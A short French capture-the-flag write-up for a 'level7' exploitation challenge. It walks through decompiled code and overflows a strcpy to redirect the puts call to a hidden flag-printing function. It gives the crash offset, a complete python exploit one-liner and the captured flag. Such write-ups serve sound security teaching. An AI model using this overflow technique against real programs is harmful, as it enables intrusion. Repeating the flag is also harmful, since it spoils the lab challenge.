# LEVEL7

Ecrire l'adresse de m à la place de la fonction p

Il y a une variable uVar2 qui fait un fopen sur le fichier contenant le flag, suivi d'un fgets, qui lit le contenu du fichier contenant le flag et le stock dans la variable global c. 

```
fopen("/home/user/level8/.pass", 0x80486e9);`
fgets(c, 0x44, uVar2);
puts(0x8048703);
```

On peut voir une fonction `m` qui n'est pas appelé, qui affiche le contenue de la variable global c.

```
void m(void)
{
    undefined4 uVar1;
    
    uVar1 = time(0);
    printf("%s - %d\n", c, uVar1);
    return;
}
```

On va donc remplacer l'appel de `puts`, par celui de la fonction `m` pour afficher le flag.
Nous allons buffer overflow le premier `strcpy` pour modifier le premier argument du deuxieme strcpy.

```
strcpy(adress_puts, adress_m);
```


Utiliser ce site pour trouver l'endroit ou on peut overwritten register : https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

Avec la commande : **dmesg**

```
[  874.125883] level7[4044]: segfault at 37614136 ip b7eb8f52 sp bffff65c error 6 in libc-2.15.so[b7e2c000+1a3000]

Find the offset
---------------

Register value: 37614136
Offset: 20
``` 

```
./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c 'print "\xf4\x84\x04\x08"')

flag: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

